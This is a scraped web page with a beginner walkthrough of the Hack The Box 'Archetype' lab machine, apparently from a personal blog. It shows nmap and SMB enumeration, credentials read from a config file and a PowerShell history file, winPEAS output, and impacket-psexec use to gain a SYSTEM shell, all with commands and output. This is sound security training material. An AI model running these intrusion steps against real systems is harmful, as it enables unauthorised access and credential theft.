VULNERABLE [\u003e] https://github.com/padovah4ck/CVE-2019-1253 [\u003e] https://github.com/sgabe/CVE-2019-1253 [!] CVE-2019-1315 : VULNERABLE [\u003e] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html [!] CVE-2019-1385 : VULNERABLE [\u003e] https://www.youtube.com/watch?v=K6gHnr-VkAg [!] CVE-2019-1388 : VULNERABLE [\u003e] https://github.com/jas502n/CVE-2019-1388 [!] CVE-2019-1405 : VULNERABLE [\u003e] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/ [\u003e] https://github.com/apt69/COMahawk [!] CVE-2020-0668 : VULNERABLE [\u003e] https://github.com/itm4n/SysTracingPoc [!] CVE-2020-0683 : VULNERABLE [\u003e] https://github.com/padovah4ck/CVE-2020-0683 [\u003e] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1 [!] CVE-2020-1013 : VULNERABLE [\u003e] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/ [*] Finished. Found 12 potential vulnerabilities. ... ... ... ����������͹ Analyzing Windows Files Files (limit 70) C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt C:\\Users\\Default\\NTUSER.DAT C:\\Users\\sql_svc\\NTUSER.DAT ����������͹ Analyzing Other Windows Files Files (limit 70) /---------------------------------------------------------------------------\\ | Do you like PEASS? | |---------------------------------------------------------------------------| | Become a Patreon : https://www.patreon.com/peass | | Follow on Twitter : @carlospolopm | | Respect on HTB : SirBroccoli \u0026 makikvues | |---------------------------------------------------------------------------| | Thank you! | \\---------------------------------------------------------------------------/ C:\\Users\\sql_svc\\Downloads\u003e winpeas\nTASK 7 Question: What file contains the administrator’s password?\nThe output from winPEAS is quite lengthly (only a snippet is shown in TASK6), but one of the last lines mentioned the location of the powershell history file.\n... ����������͹ Analyzing Windows Files Files (limit 70) C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt ... Checking it will lead us to some administrator credentials.\nC:\\Users\\sql_svc\\Downloads\u003etype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit C:\\Users\\sql_svc\\Downloads\u003e ConsoleHost_history.txt\nSUBMIT FLAG Question: Submit user flag\nIn TASK5 we used two different approaches to grab the user flag.\nflag\nSUBMIT FLAG Question: Submit root flag\nWe can use the\nadmin credentials username administrator password MEGACORP_4dm1n!! found in TASK7 to get an admin shell on the target. Using psexec from impacket will land us system privileges.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ impacket-psexec administrator@$rhost Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra Password: [*] Requesting shares on 10.129.63.163..... [*] Found writable share ADMIN$ [*] Uploading file ZUxKInhO.exe [*] Opening SVCManager on 10.129.63.163..... [*] Creating service EEnc on 10.129.63.163..... [*] Starting service EEnc..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.2061] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami nt authority\\system C:\\Windows\u003e These high-level privileges provide us with access to the administrator’s desktop - C:\\Windows\u003ecd C:\\Users\\Administrator\\Desktop - This is where our root flag resides.\nC:\\Windows\u003ecd C:\\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop\u003edir Volume in drive C has no label. Volume Serial Number is 9565-0B4F Directory of C:\\Users\\Administrator\\Desktop 07/27/2021 02:30 AM . 07/27/2021 02:30 AM .. 02/25/2020 07:36 AM 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 10,689,736,704 bytes free C:\\Users\\Administrator\\Desktop\u003e All left for now is to grab the root flag and terminate the connection.\nC:\\Users\\Administrator\\Desktop\u003etype root.txt C:\\Users\\Administrator\\Desktop\u003eexit [*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0 [*] Opening SVCManager on 10.129.63.163..... [*] Stopping service EEnc..... [*] Removing service EEnc..... [*] Removing file ZUxKInhO.exe..... ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype] └──╼ [★]$ flag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"3355","inLanguage":"en","datePublished":"2023-05-11T08:00:00Z","dateModified":"2023-05-11T08:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/archetype/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Archetype - Walkthrough</h1><div class=post-meta><span title='2023-05-11 08:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;16 min&nbsp;·&nbsp;3355 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li><li><a href=#submit-flag-1><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Archetype</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 2</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>Which TCP port is hosting a database server?</em></p><p>We start our <strong>recon</strong> with a quick <strong>connection</strong> check.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.63.163 <span class=o>(</span>10.129.63.163<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.63.163: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>12.0 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.63.163: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>11.4 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.63.163: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>11.7 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.63.163: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>11.4 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.63.163 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 11.352/11.636/12.018/0.265 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Then we follow up on it with <strong>scanning</strong> the top 1000 tcp <strong>ports</strong>(version and script scan).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sC -sV <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-11 14:33 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.63.163
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.057s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE      VERSION
</span></span><span class=line><span class=cl>135/tcp  open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds Windows Server <span class=m>2019</span> Standard <span class=m>17763</span> microsoft-ds
</span></span><span class=line><span class=cl>1433/tcp open  ms-sql-s     Microsoft SQL Server <span class=m>2017</span> 14.00.1000.00<span class=p>;</span> RTM
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2023-05-11T13:33:22+00:00<span class=p>;</span> +1s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span>_ms-sql-ntlm-info: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>SSL_Self_Signed_Fallback
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2023-05-11T13:25:34
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2053-05-11T13:25:34
</span></span><span class=line><span class=cl><span class=p>|</span>_ms-sql-info: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OSs: Windows, Windows Server <span class=m>2008</span> R2 - 2012<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 1h45m01s, deviation: 3h30m00s, median: 0s
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows Server <span class=m>2019</span> Standard <span class=m>17763</span> <span class=o>(</span>Windows Server <span class=m>2019</span> Standard 6.3<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: Archetype
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: ARCHETYPE<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Workgroup: WORKGROUP<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2023-05-11T06:33:14-07:00
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   311: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-05-11T13:33:16
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 16.32 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p><strong>Four</strong> <strong>ports</strong> are reported to be <strong>open</strong> on our <strong>target</strong>. Additionally, there are some other <strong>interesting</strong> pieces of <strong>information</strong> to take note of:</p><ul><li>OS:Microsoft Windows</li><li>sql server running on tcp port 1433</li><li>guest login is enabled for port 445 (smb)</li></ul><p>Let us <strong>capitalize</strong> on <strong>this information</strong>.</p><blockquote><p>1433</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What is the name of the non-Administrative share available over SMB?</em></p><p>Using the <em>guest</em> <strong>username</strong> (<em>guest-access</em>) and <strong>listing</strong> the <strong>shares</strong> available on <em><strong>smb</strong></em> will directs us toward the <em>backups</em> <strong>share</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient -U guest -L <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\g</span>uest<span class=o>]</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	Sharename       Type      Comment
</span></span><span class=line><span class=cl>	---------       ----      -------
</span></span><span class=line><span class=cl>	ADMIN$          Disk      Remote Admin
</span></span><span class=line><span class=cl>	backups         Disk      
</span></span><span class=line><span class=cl>	C$              Disk      Default share
</span></span><span class=line><span class=cl>	IPC$            IPC       Remote IPC
</span></span><span class=line><span class=cl>SMB1 disabled -- no workgroup available
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><blockquote><p>backups</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the password identified in the file on the SMB share?</em></p><p><strong>Accessing</strong> the <strong>share</strong> and <strong>listing</strong> it&rsquo;s contents brings us to the - <em>prod.dtsConfig</em> - <strong>file</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient -U guest <span class=se>\\\\</span><span class=nv>$rhost</span><span class=se>\\</span>backups
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\g</span>uest<span class=o>]</span>:
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Mon Jan <span class=m>20</span> 12:20:57 <span class=m>2020</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Mon Jan <span class=m>20</span> 12:20:57 <span class=m>2020</span>
</span></span><span class=line><span class=cl>  prod.dtsConfig                     AR      <span class=m>609</span>  Mon Jan <span class=m>20</span> 12:23:02 <span class=m>2020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>5056511</span> blocks of size 4096. <span class=m>2531250</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> get prod.dtsConfig
</span></span><span class=line><span class=cl>getting file <span class=se>\p</span>rod.dtsConfig of size <span class=m>609</span> as prod.dtsConfig <span class=o>(</span>12.1 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 12.1 KiloBytes/sec<span class=o>)</span>
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> <span class=nb>exit</span>
</span></span></code></pre></div><p>After the <strong>download</strong> is finished, <strong>opening</strong> it on our local machine will bring us a nice surprise.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype]
</span></span></span><span class=line><span class=cl><span class=err>└──╼ [★]$ cat prod.dtsConfig 
</span></span></span><span class=line><span class=cl><span class=err>&lt;DTSConfiguration&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;DTSConfigurationHeading&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;DTSConfigurationFileInfo GeneratedBy=&#34;...&#34; GeneratedFromPackageName=&#34;...&#34; GeneratedFromPackageID=&#34;...&#34; GeneratedDate=&#34;20.1.2019 10:01:34&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/DTSConfigurationHeading&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;Configuration ConfiguredType=&#34;Property&#34; Path=&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34; ValueType=&#34;String&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/Configuration&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/DTSConfiguration&gt;
</span></span></span><span class=line><span class=cl><span class=err>┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-9swjmh1jnx]─[~/archetype]
</span></span></span><span class=line><span class=cl><span class=err>└──╼ [★]$
</span></span></span></code></pre></div><p>Even though it looks like some configuration file, there are some <strong>potential credentials</strong> hidden there.</p><table><thead><tr><th>potential credentials</th><th></th></tr></thead><tbody><tr><td><em>host</em></td><td style=text-align:left>ARCHETYPE</td></tr><tr><td><em>username</em></td><td style=text-align:left>sql_svc</td></tr><tr><td><em>password</em></td><td style=text-align:left>M3g4c0rp123</td></tr></tbody></table><p>But since proper <strong>recon</strong> is always the <strong>key</strong>, we make sure to check out the other <strong>shares</strong> too, even if they do not look that interesting at first sight.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient -U guest <span class=se>\\\\</span><span class=nv>$rhost</span><span class=se>\\</span>ADMIN$
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\g</span>uest<span class=o>]</span>:
</span></span><span class=line><span class=cl>tree connect failed: NT_STATUS_ACCESS_DENIED
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient -U guest <span class=se>\\\\</span><span class=nv>$rhost</span><span class=se>\\</span>IPC$
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\g</span>uest<span class=o>]</span>:
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>NT_STATUS_NO_SUCH_FILE listing <span class=se>\*</span>
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> <span class=nb>exit</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>We were right, nothing interesting there. But still, it never hurts to check.</p><blockquote><p>M3g4c0rp123</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</em></p><p>Once we have <em><strong>Impacket</strong></em> installed, using the <strong>tab-autocomplete</strong> feature can help us out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ impacket-
</span></span><span class=line><span class=cl>impacket-addcomputer        impacket-lookupsid          impacket-rpcmap
</span></span><span class=line><span class=cl>impacket-atexec             impacket-mimikatz           impacket-sambaPipe
</span></span><span class=line><span class=cl>impacket-dcomexec           impacket-mqtt_check         impacket-samrdump
</span></span><span class=line><span class=cl>impacket-dpapi              impacket-mssqlclient        impacket-secretsdump
</span></span><span class=line><span class=cl>impacket-esentutl           impacket-mssqlinstance      impacket-services
</span></span><span class=line><span class=cl>impacket-exchanger          impacket-netview            impacket-smbclient
</span></span><span class=line><span class=cl>impacket-findDelegation     impacket-nmapAnswerMachine  impacket-smbexec
</span></span><span class=line><span class=cl>impacket-GetADUsers         impacket-ntfs-read          impacket-smbrelayx
</span></span><span class=line><span class=cl>impacket-getArch            impacket-ntlmrelayx         impacket-smbserver
</span></span><span class=line><span class=cl>impacket-GetNPUsers         impacket-ping               impacket-sniff
</span></span><span class=line><span class=cl>impacket-getPac             impacket-ping6              impacket-sniffer
</span></span><span class=line><span class=cl>impacket-getST              impacket-psexec             impacket-split
